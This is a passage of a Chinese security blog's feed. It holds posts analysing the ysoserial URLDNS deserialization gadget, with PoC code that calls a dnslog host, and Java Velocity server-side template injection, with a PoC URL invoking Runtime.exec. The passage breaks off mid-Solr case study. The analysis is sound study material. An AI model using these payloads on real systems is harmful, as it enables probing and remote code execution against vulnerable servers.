      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</title>
    <link href="https://summersec.github.io/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>https://summersec.github.io/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-05-06T04:42:16.000Z</published>
    <updated>2020-05-06T07:17:45.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发：<a href="https://www.sec-in.com/article/299" target="_blank" rel="noopener">https://www.sec-in.com/article/299</a><br>&emsp;&emsp;2015年Gabriel Lawrence(@gebl)和Chris Frohoff(@frohoff)在AppSecCali大会上提出的利用Apache Commons Collections来构造命令执行利用链，随后发布ysoserial工具，从此打开Java安全的蓝海。<br>&emsp;&emsp; 利用链(gadget chains)，俗称gadget。通俗来说就是一种利用方法，它是从触发位置开始到执行命令的位置结束，也可以说是漏洞验证方法(POC)。<br>&emsp;&emsp; 使用方法，GitHub下载jar包或者git源码自己编译。</p><blockquote><p>java -jar ysoseial.jar URLDNS “<a href="http://baidu.com&quot;" target="_blank" rel="noopener">http://baidu.com&quot;</a></p></blockquote><p>再将生成号POC发送目标，如果目标存在反序列化漏洞，并且满足利用链条件，则命令将会被执行。</p><p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p> &emsp;&emsp; <code>URLDNS</code>是其中的一个gadget的名字，此gadget不能执行命令，通常用来验证目标是否存在反序列化漏洞。URLDNS gadget十分适合用来验证目标是否存在反序列化漏洞。</p><ul><li>此gadget完全使用Java内置的类构造，无需第三方库支持。</li><li>如果目标没有回显，通过DNS解析请求是否存在来判断存在反序列化漏洞。</li></ul><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开<code>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</code>查看源码，但笔者这里使用自己改写的源码来分析此gadget链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> samny.serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> samny.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="keyword">null</span>,<span class="string">"http://4h9yq1.dnslog.cn"</span>,handler);</span><br><span class="line">        hm.put(url,url);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(url,<span class="string">"hashCode"</span>,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"url"</span>));</span><br><span class="line">        oos.writeObject(hm);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"url"</span>));</span><br><span class="line"><span class="comment">// 注释这行代码是不会产生dns解析请求，</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 漏洞分析之前，我们先看看漏洞执行效果。<br>&emsp;&emsp; 分析一个在线dns解析记录网站<a href="http://www.dnslog.cn" target="_blank" rel="noopener">DNSlog Platform</a>，网站无需任何登录注册，国内访问速度也快，DNS记录获取速度没得说，子域名可以无限更换。<br><img src="https://img-blog.csdnimg.cn/20200427153912402.png" alt="在这里插入图片描述"><br><strong>漏洞复现步骤</strong></p><ol><li>修改你能过记录dns解析的网址。<br><img src="https://img-blog.csdnimg.cn/20200427154428787.png" alt="在这里插入图片描述"></li><li>直接运行main方法，刷新记录。</li></ol><h2 id="断点分析"><a href="#断点分析" class="headerlink" title="断点分析"></a>断点分析</h2><p>&emsp;&emsp; 触发反序列化漏洞的方法是<code>readObject</code>，所以笔者在43行代码处和<code>hashmap</code>的<code>readObject</code>各设置一个断点。<br>PS:</p><ul><li>以免dns记录混淆，建议每次分析都换一个域名。</li><li>此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？</li><li>其实搜索是可以搜索导入包的内容的，<code>Ctrl+Shift+F</code> 在<code>Scope - All Places</code>搜索<code>class hashmap</code>即可。<br><img src="https://img-blog.csdnimg.cn/20200427155537417.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 断点设置好了，开始分析，笔者这里直接从HashMap.java的<code>readObject</code>开始分析。<br>hashmap中readObject会调用putVal方法是往HashMap中放入键值对的方法，进而会计算hashcode值。<br><img src="https://img-blog.csdnimg.cn/20200427155709722.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接着会判断key是否为空，hashCode是否不等于-1，不等于-1会直接返回，等于-1会重新计算。这时候我们看笔者写源码36行，修改方法hashCode的值为-1，这时你是否明白此时的用意。<br><img src="https://img-blog.csdnimg.cn/20200427160955616.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161035866.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161223686.png" alt="在这里插入图片描述"></li></ul><p>&emsp;&emsp; 计算<code>hash</code>的时候会跳转到<code>java.net.URLStreamHandler.java#hashCode</code>方法来计算hash。注意看图片中被框住的一行代码，hashCode在计算hash时，会调用<code>getHostAddress()</code>方法，进而调用<code>getByName(host)</code>方法。<br><img src="https://img-blog.csdnimg.cn/20200427161513369.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 执行方法，我们发现会有一个等待时间大概2秒钟之后(其实就是DNS解析所需要的时间)，可以获取DNS解析记录。<br><img src="https://img-blog.csdnimg.cn/20200427162302103.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200427162013698.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020042716232791.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427162708718.png" alt="在这里插入图片描述"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 整个的<code>URLDNS</code>的gadget其实清晰又简单。</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>&emsp;&emsp; 其实作者在博客中写道，可以用四行代码就可以实现此gadget chains，反观ysoserial中源码，去掉注释也多还有几行代码，<code>多出的代码时干嘛的呢？</code></p><p><img src="https://img-blog.csdnimg.cn/20200427164430117.png" alt="在这里插入图片描述"></p><h2 id="巧妙避免重复"><a href="#巧妙避免重复" class="headerlink" title="巧妙避免重复"></a>巧妙避免重复</h2><p>&emsp;&emsp; 多出几行代码，我们来分析一下。ysoserial的作者重写了URLStreamHandler其中两个方法。但是我们还没搞清楚其中的作用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 老规矩，断点撸码。不过此时断点应该设置在哪？笔者按照源作者的代码，去掉序列化和反序列化的过程。剩下代码也就上面的和下面图片给出的5行代码，分析不难发现断点应该设置在<code>hm.put()</code>。其中31和32行代码肯定是不会去设置断点的，至于36行在之前就说明其作用。<br><img src="https://img-blog.csdnimg.cn/20200427171425793.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 调试代码不能发现，put方法也和hashmap中的readObject方法的方法是差不多的，继续跟进。<br><img src="https://img-blog.csdnimg.cn/20200427171917233.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 继续跟进还是来到<code>java.net.URLStreamHandler#hashCode</code>方法，但此时方法会跳转到笔者复写的方法中，返回应该<code>null</code>，进而就不会去解析dns。<br><img src="https://img-blog.csdnimg.cn/20200427172155144.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427172348537.png" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 为什么hashmap中putval方法就不会跳转到我们复现的类方法里面返回一个null呢？（个人见解，源码无法修改所以无法调试）<br>答：反序列化时应该时将二进制代码直接读取，进去调用hashmap中readObject方法，此时反序列化完全是使用jdk源码调用，不会再去看我们用户复写方法。<br>&emsp;&emsp; 笔者这里有点事实可以整明我的观点。<br>众所周知Java是代码是一行一行的去编译解释的，我们复现的类URLStreamHandler，实现的类对象hander在url进实例化的时候处理了，也就是33行代码。但是进行反序列化操作的时候，并没有将此复现方法进行序列化，所以反序列化的时候不会处理URL，计算hash值的时候，不可能跳转到我们复写的方法返回一个null，只能是跳转到原本的方法中。<br><img src="https://img-blog.csdnimg.cn/20200427174533677.png" alt="在这里插入图片描述"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 当URL最初被放在HashMap中时，通过可以调用put，HashMap.hashMap.hash方法被调用。这个方法反过来又会调用该URL的hashCode，但是hashCode是有一个缓存值的，并不会触发DNS解析。但是我们可以在读取数据流的时候，在URL添加到HashMap中重置缓存值(使其hashCode=-1)，来确保DNS解析。可以使用Java的Reflection中setFieldValue方法来达到重置hashCode值为-1。<br>&emsp;&emsp; Ysoserial用一个类复写完美避免重复DNSLOG，感概其作者的神奇逻辑思维能力。有兴趣的朋友完全可以去注释掉<code>getHostAddress</code>方法亦或者是删除掉整个handler代码，然后就会出现DNSLOG。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神Java安全漫谈 - 08.反序列化篇(2)<br><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank" rel="noopener">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a><br><a href="https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/" target="_blank" rel="noopener">https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文章首发：&lt;a href=&quot;https://www.sec-in.com/article/299&quot; target=&quot;_blank&quot; rel=
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ysoserial-Gadget" scheme="https://summersec.github.io/tags/ysoserial-Gadget/"/>
    
  </entry>
  
  <entry>
    <title>Skipped breakpoint because it happened inside debugger evaluation</title>
    <link href="https://summersec.github.io/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/"/>
    <id>https://summersec.github.io/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/</id>
    <published>2020-05-05T04:42:16.000Z</published>
    <updated>2020-05-06T07:21:37.897Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp; 解决Skipped breakpoint at %code reference% because it happened inside debugger evaluation的通用方法。<br><img src="https://img-blog.csdnimg.cn/20200505201706460.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200505201642976.png" alt="在这里插入图片描述"></p><ol><li>先尝试去掉勾选 <code>Enable &#39;tostring0&#39; object view</code><blockquote><p>因为idea的debugger是默认会在内部将方法执行一次，然后回显提示数据，本意是很好，但有时候会干扰影响结果。</p></blockquote></li></ol><p><img src="https://img-blog.csdnimg.cn/20200505201349162.png" alt="在这里插入图片描述"></p><ol start="3"><li>如果还是不行就再去掉勾选<code>Enable alternative view for Collections classes</code>一定是可以的。<blockquote><p>idea默认在用户调试之前先执行<code>toString</code>方法，然后回显数据，也就是<code>“预知”</code>功能。但有时候会影响判断，但可以设置那些类中<code>toString</code>方法是是可以做<code>“预知”</code>。</p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;&amp;emsp; 解决Skipped breakpoint at %code reference% because it happened inside debugger evaluation的通用方法。&lt;br&gt;&lt;img src=&quot;https://img-blog.
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java debugger" scheme="https://summersec.github.io/tags/Java-debugger/"/>
    
  </entry>
  
  <entry>
    <title>白头搔更短，SSTI惹人心！</title>
    <link href="https://summersec.github.io/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/"/>
    <id>https://summersec.github.io/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/</id>
    <published>2020-03-24T07:20:16.000Z</published>
    <updated>2020-05-06T07:19:31.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>为什么说Java审计南在SSTI呢？</strong></p><ol><li>现行SSTI(Server-Side Template Injection ) 资料不少，但与Java，以著名的先知社区为例（如下图所示），关于SSTI文章也不过几篇而已，但与Java相关的一篇都没有。<br><img src="https://img-blog.csdnimg.cn/2020031517280148.png" alt="在这里插入图片描述"></li><li>搜索CVE漏洞有关于SSTI的漏洞编号也不过只有几个而已。<br><img src="https://img-blog.csdnimg.cn/20200317133833592.png" alt="在这里插入图片描述"></li><li>如果你是一名老司机，已经挖过ssti漏洞，那你是否知道payload构造原理呢？本文为你解惑！老司机可以直接跳转到后记看本文，或者你只是想看payload构造原理亦如此，本文篇幅较长，建议先收藏。</li></ol><hr><h1 id="SSTI-服务端模板注入"><a href="#SSTI-服务端模板注入" class="headerlink" title="SSTI 服务端模板注入"></a>SSTI 服务端模板注入</h1><p>&emsp;&emsp; ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p><p><img src="https://img-blog.csdnimg.cn/202003161429497.gif" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span></span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        <span class="comment">// 使用Velocity</span></span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>POC</strong><br><code>http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</code></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Velocity.evaluate函数源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>设置断点开始调试</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316151247751.png" alt="在这里插入图片描述"></p><ul><li>进入Velocity.evaluate方法查看方法详情</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200316151614641.png" alt="在这里插入图片描述"></p><ul><li>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316152752486.png" alt="在这里插入图片描述"></p><ul><li>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316153220725.png" alt="在这里插入图片描述"></p><ul><li>进入StringReader看看</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316154323392.png" alt="在这里插入图片描述"></p><ul><li>在进入evaluate查看方法具体实现过程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer writer, String logTag, Reader reader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (logTag == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            SimpleNode nodeTree = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 来到这里进行解析</span></span><br><span class="line">                nodeTree = <span class="keyword">this</span>.parse(reader, logTag);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var7, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TemplateInitException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var8, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">// 判断，然后进入this.render方法</span></span><br><span class="line">            <span class="keyword">return</span> nodeTree == <span class="keyword">null</span> ? <span class="keyword">false</span> : <span class="keyword">this</span>.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>继续跟进render方法</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161419209.png" alt="在这里插入图片描述"></p><ul><li>render方法里面还有一个render方法，真的是™烦。不过这个是simpleNodel类的render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161613552.png" alt="在这里插入图片描述"></p><ul><li><strong>高潮激情部分</strong>，由于前面两个没有什么用，让我们直接跳到第三个看，进入render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162015493.png" alt="在这里插入图片描述"></p><ul><li>在这里我们不能发现有一个execute方法，这就是罪魁祸首。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162552984.png" alt="在这里插入图片描述"></p><ul><li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 截取的部分关键性源代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numChildren; ++i) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.strictRef &amp;&amp; result == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            methodName = <span class="keyword">this</span>.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> VelocityException(<span class="string">"Attempted to access '"</span> + methodName + <span class="string">"' on a null value at "</span> + Log.formatFileString(<span class="keyword">this</span>.uberInfo.getTemplateName(), <span class="keyword">this</span>.jjtGetChild(i).getLine(), <span class="keyword">this</span>.jjtGetChild(i).getColumn()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        previousResult = result;</span><br><span class="line">                        result = <span class="keyword">this</span>.jjtGetChild(i).execute(result, context);</span><br><span class="line">                        <span class="keyword">if</span> (result == <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.strictRef) &#123;</span><br><span class="line">                            failedChild = i;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</p></li><li><p>previousResult = result;首先这行代码使其它们保持一致</p></li><li><p>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE<br><img src="https://img-blog.csdnimg.cn/20200316155414726.png" alt="在这里插入图片描述"></p></li><li><p>完整的效果展示<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xMTE0NTgwMS1mYjEyMzA5YjRjMDU5MmE2LmdpZg" alt></p></li><li><p>完整的调用链</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162402512.png" alt="在这里插入图片描述"></p><hr><h1 id="案例分析-—-Apache-solr-Velocity-模版注入"><a href="#案例分析-—-Apache-solr-Velocity-模版注入" class="headerlink" title="案例分析 — Apache solr Velocity 模版注入"></a>案例分析 — Apache solr Velocity 模版注入</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 这个漏洞是去年10月底爆出的漏洞，这里只做必要的简单复现，笔者在这篇文章里主要是分析，更加完整的<a href="https://blog.csdn.net/sun1318578251/article/details/102843715" target="_blank" rel="noopener">漏洞复现过程</a>参考。</p><ol><li>第一步修改配置，开启Velocity模版里<code>VelocityResponseWriter</code>初始化参数的<code>params.resource.loader.enabled</code>选项，该选项默认是<code>false</code>。查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">W3Cschool solr官方文档</a>可知，solr是配置api可以进行查看配置、修改配置的。</li></ol><p>访问查看<code>http://127.0.0.1:8983/solr/test/config</code>配置信息<br><img src="https://img-blog.csdnimg.cn/20200321162727737.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 